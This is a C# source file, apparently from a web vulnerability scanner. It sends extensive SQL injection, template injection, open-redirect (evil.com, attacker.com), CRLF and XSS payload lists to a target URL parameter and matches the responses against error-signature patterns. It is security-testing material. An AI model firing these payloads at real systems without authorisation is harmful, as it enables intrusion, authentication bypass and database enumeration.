using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

public static class VulnerabilityTests
{
    // 1. SQL Injection (BAV)
    static readonly string[] SqlErrorPatterns = new[]
    {
        // MySQL, PostgreSQL, MSSQL, Oracle, SQLite, ODBC, Hibernate, PDO, etc.
        "SQL syntax; check the manual that corresponds to your MySQL",
        "Warning.*?mysqli?",
        "Unclosed quotation mark after the character string",
        "PostgreSQL.*ERROR",
        "you have an error in your sql syntax;",
        "warning: mysql",
        "quoted string not properly terminated",
        "pg_query\\(",
        "syntax error at or near",
        "sqlite error",
        "sql syntax.*?mysql",
        "fatal error",
        "odbc sql server driver",
        "microsoft access driver",
        "mysql_fetch_array",
        "mysql_num_rows",
        "mysql_fetch_assoc",
        "mysql_fetch_row",
        "mysql_numrows",
        "mysql_result",
        "syntax error",
        "unexpected end of SQL command",
        "ORA-01756",
        "Microsoft OLE DB Provider for ODBC Drivers",
        "Incorrect syntax near",
        "System.Data.SqlClient.SqlException",
        "Invalid Querystring",
        "OLE DB Provider for ODBC",
        "VBScript Runtime",
        "ADODB.Field error",
        "BOF or EOF is True",
        "ADODB.Command error",
        "JET Database",
        "Syntax error in string in query expression",
        "mysql_numrows() expects parameter 1",
        "supplied argument is not a valid MySQL result resource",
        "check the manual that corresponds to your MySQL server version",
        "java.sql.SQLException",
        "org.hibernate.exception",
        "Pdo\\Exception",
        "PDOException",
        "com.mysql.jdbc.exceptions",
        "MySqlException",
        "SQLITE_ERROR",
        "SQLite3::query()",
        "PG::SyntaxError:",
        // Extended error signatures
        "Division by zero",
        "invalid input syntax for",
        "unterminated quoted string",
        "You have an error in your SQL syntax",
        "mysql_fetch_object",
        "mysql_fetch_array",
        "mysql_num_rows",
        "mysql_pconnect",
        "mysql_query",
        "mysql_",
        "mysqli_"
    };

    // Most comprehensive SQLi payloads (classic, stacked, time-based, WAF bypass, error-based, enumeration, authentication, order/group by, mutational)
    static readonly string[] SqliPayloads = new[]
    {
        // Classic
        "'", "\"", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1", "') OR ('1'='1", "\") OR (\"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--", "' OR 'a'='a", "\" OR \"a\"=\"a", "' OR 1=1#", "\" OR 1=1#",
        "' UNION SELECT NULL--", "\" UNION SELECT NULL--", "' AND 1=0 UNION SELECT 1,2,3--",
        // Stacked queries
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT SLEEP(5)--",
        // WAF bypass & encoding
        "%27%20OR%201%3D1--", "%22%20OR%201%3D1--", "%27%20OR%20%271%27=%271--",
        "' OR 1=1 LIMIT 1--",
        "' OR SLEEP(5)--",
        "' OR 'a'='a'--",
        "admin' --",
        "admin' #",
        "admin'/*",
        // Blind
        "' AND 1=2 UNION SELECT SLEEP(5)--",
        "' AND 1=2 UNION SELECT pg_sleep(5)--",
        // Numeric
        "1 OR 1=1",
        "1' OR '1'='1' --",
        // Comment style
        "'/*",
        "'/*!50000UNION*/ SELECT * FROM information_schema.tables--",
        // Hex
        "' OR 0x50=0x50--",
        // Time-based
        "' OR IF(1=1,SLEEP(5),0)--",
        // More
        "' OR 1 GROUP BY CONCAT_WS(0x3a,user(),version(),database())--",
        // Column number discovery
        "'UNION SELECT NULL-- -",
        "'UNION SELECT NULL,NULL-- -",
        "'UNION SELECT NULL,NULL,NULL-- -",
        "'UNION SELECT NULL,NULL,NULL,NULL-- -",
        "'UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        // Oracle
        "'UNION SELECT NULL FROM DUAL-- -",
        "'UNION SELECT NULL,NULL FROM DUAL-- -",
        "'UNION SELECT NULL,NULL,NULL FROM DUAL-- -",
        // Order by/Enumeration
        "' UNION ORDER BY 1-- -",
        "' UNION ORDER BY 2-- -",
        "' UNION ORDER BY 3-- -",
        "' UNION ORDER BY 4-- -",
        "' UNION ORDER BY 5-- -",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' ORDER BY 1,2--+",
        "1' ORDER BY 1,2,3--+",
        "1' GROUP BY 1,2--+",
        "1' GROUP BY 1,2,3--+",
        "' GROUP BY columnnames having 1=1 --",
        // Table/Column enumeration
        "' UNION SELECT @@version -- -",
        "' UNION SELECT banner from v$version -- -",
        "' UNION SELECT version from v$instance -- -",
        "' UNION SELECT version() -- -",
        "' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -",
        "' UNION SELECT table_name,NULL FROM all_tables  -- -",
        "' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name=\"X\" -- -",
        "' UNION SELECT column_name,NULL FROM all_tab_columns where table_name=\"X\"  -- -",
        // Column value concat
        "' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -",
        "' UNION SELECT col1 ':' col2 from table_name limit 1 -- -",
        "' UNION SELECT col1 ||':'||col2, null FROM table_name where table_name=\"X\"  -- -",
        "' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -",
        // Error/Conditional
        "' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -",
        "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -",
        "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -",
        "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -",
        // Time-based
        ",(select * from (select(sleep(10)))a)",
        "';WAITFOR DELAY '0:0:30'--",
        // Authentication
        "or true--",
        ") or true--",
        "') or true--",
        "admin') or ('1'='1'--",
        "admin') or ('1'='1'#",
        "admin') or ('1'='1'/",
        // MSSQL special
        "-1 UNION SELECT 1 INTO @,@",
        "-1 UNION SELECT 1 INTO @,@,@",
        "1 AND (SELECT * FROM Users) = 1",
        "' AND MID(VERSION(),1,1) = '5';",
        "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
        // Mutational (case, whitespace, comment, encoding)
        "'/**/OR/**/1=1--",
        "' OR\n1=1--",
        "' OR\r1=1--",
        "' OR\t1=1--",
        "' OR 1=1;--",
        "' OR 1=1 /*",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' || '1'='1' --",
        "' OR 'unusual'='unusual'--",
        // More
        "' OR 1=1;--",
        "' OR 1=1 /*",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' || '1'='1' --",
        "' OR 'unusual'='unusual'--",
    };

    public static bool DetectSqlInjection(string responseBody)
    {
        foreach (var pattern in SqlErrorPatterns)
        {
            if (Regex.IsMatch(responseBody, pattern, RegexOptions.IgnoreCase))
                return true;
        }
        return false;
    }

    public static async Task<(bool, string)> DetectSqlInjectionActive(HttpClient client, string url, string param)
    {
        foreach (var payload in SqliPayloads)
        {
            var testUrl = url.Contains("?") ? $"{url}&{param}={Uri.EscapeDataString(payload)}" : $"{url}?{param}={Uri.EscapeDataString(payload)}";
            var resp = await client.GetAsync(testUrl);
            var body = await resp.Content.ReadAsStringAsync();
            if (DetectSqlInjection(body))
                return (true, $"Payload: {payload}");
        }
        return (false, null);
    }

    // 2. Server-Side Template Injection (SSTI)
    static readonly string[] SstiPayloads = new[]
    {
        "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "{{7*'7'}}", "{{1337*1337}}", "{{1337+1}}", "<%= 1337+1 %>", "{{config}}", "{{self}}", "{{[].__class__.__mro__[1].__subclasses__()}}",
        // More template engines
        "<%={{7*7}}%>", "{{=7*7}}", "<#= 7*7 #>", "${{7*7}}", "{{=it.test}}", "{{this.constructor.constructor('alert(1)')()}}"
    };
    static readonly string[] SstiErrorPatterns = new[]
    {
        "undefined:(0x)?[a-f0-9]+",
        "jinja2\\.exceptions",
        "Twig_Error_Syntax",
        "Error: Problem parsing template",
        "TemplateSyntaxError",
        "must be str, not int",
        "django.template",
        "Freemarker template error",
        "org.thymeleaf.exceptions",
        "Liquid error",
        "VelocityException",
        "SmartyException",
        "Handlebars: Access has been denied",
        "must be string, not int",
        // More
        "unexpected token",
        "ReferenceError: .* is not defined",
        "TypeError: .* is not a function"
    };

    public static async Task<(bool, string)> DetectSsti(HttpClient client, string url, string param)
    {
        foreach (var payload in SstiPayloads)
        {
            var testUrl = url.Contains("?") ? $"{url}&{param}={Uri.EscapeDataString(payload)}" : $"{url}?{param}={Uri.EscapeDataString(payload)}";
            var resp = await client.GetAsync(testUrl);
            var body = await resp.Content.ReadAsStringAsync();
            if (body.Contains("49") || body.Contains("{{7*7}}") || body.Contains("${7*7}") || body.Contains("<%=7*7%>") || DetectSstiPatterns(body))
                return (true, $"Payload: {payload}");
        }
        return (false, null);
    }

    public static bool DetectSstiPatterns(string responseBody)
    {
        foreach (var pattern in SstiErrorPatterns)
        {
            if (Regex.IsMatch(responseBody, pattern, RegexOptions.IgnoreCase))
                return true;
        }
        return false;
    }

    // 3. Open Redirect
    static readonly string[] RedirectPayloads = new[]
    {
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "//127.0.0.1",
        "//google.com",
        "//attacker.com",
        "http://attacker.com",
        "//localhost",
        "//redirect.com",
        "//example.com",
        "http://127.0.0.1",
        "http://localhost",
        "//malicious.com",
        "//ibrahimsql.evil",
        "//ibrahimsql.attacker",
        "//ibrahimsql.malicious",
        "//ibrahimsqlopenredirect.com.tr",
        // More
        "//phishing.com",
        "//redirector.com",
        "//evil.org"
    };

    public static async Task<(bool, string)> DetectOpenRedirect(HttpClient client, string url, string param)
    {
        foreach (var payload in RedirectPayloads)
        {
            var testUrl = url.Contains("?") ? $"{url}&{param}={Uri.EscapeDataString(payload)}" : $"{url}?{param}={Uri.EscapeDataString(payload)}";
            var resp = await client.GetAsync(testUrl);
            if (resp.StatusCode == System.Net.HttpStatusCode.Found || resp.StatusCode == System.Net.HttpStatusCode.MovedPermanently)
            {
                var location = resp.Headers.Location?.ToString();
                if (!string.IsNullOrEmpty(location) && (location.Contains("evil.com") || location.Contains("attacker.com") || location.Contains("malicious.com") || location.Contains("phishing.com") || location.Contains("redirector.com") || location.Contains("evil.org")))
                    return (true, $"Payload: {payload}, Redirect: {location}");
            }
        }
        return (false, null);
    }

    // 4. CRLF Injection
    static readonly string[] CrlfPayloads = new[]
    {
        "%0d%0aX-Injection:crlf-test",
        "%0d%0aSet-Cookie:crlf=1",
        "%0d%0aContent-Length:0",
        "%0d%0aLocation:https://evil.com"
    };

    public static async Task<(bool, string)> DetectCrlfInjection(HttpClient client, string url, string param)
    {
        foreach (var payload in CrlfPayloads)
        {
            var testUrl = url.Contains("?") ? $"{url}&{param}={payload}" : $"{url}?{param}={payload}";
            var resp = await client.GetAsync(testUrl);
            foreach (var header in resp.Headers)
            {
                if (header.Key.Contains("X-Injection") || header.Key.Contains("crlf") || header.Key.Contains("Set-Cookie") || header.Key.Contains("Content-Length") || header.Key.Contains("Location"))
                    return (true, $"Payload: {payload}, Header: {header.Key}");
            }
        }
        return (false, null);
    }

    // 5. SXSS (Server XSS)
    static readonly string[] SxssPayloads = new[]
    {
        "<svg/onload=alert(1337)>", "<script>alert('sxss')</script>", "'\"><img src=x onerror=alert(1)>",
        // More advanced server XSS
        "<img src=x onerror=alert('sxss')>", "<body onload=alert('sxss')>", "<iframe src=javascript:alert('sxss')>"
    };

    public static async Task<(bool, string)> DetectSxss(HttpClient client, string url, string param)
    {
        foreach (var payload in SxssPayloads)
        {
            var testUrl = url.Contains("?") ? $"{url}&{param}={Uri.EscapeDataString(payload)}" : $"{url}?{param}={Uri.EscapeDataString(payload)}";
            var resp = await client.GetAsync(testUrl);
            var body = await resp.Content.ReadAsStringAsync();
            if (body.Contains(payload))
                return (true, $"Payload: {payload}");
        }
        return (false, null);
    }
}
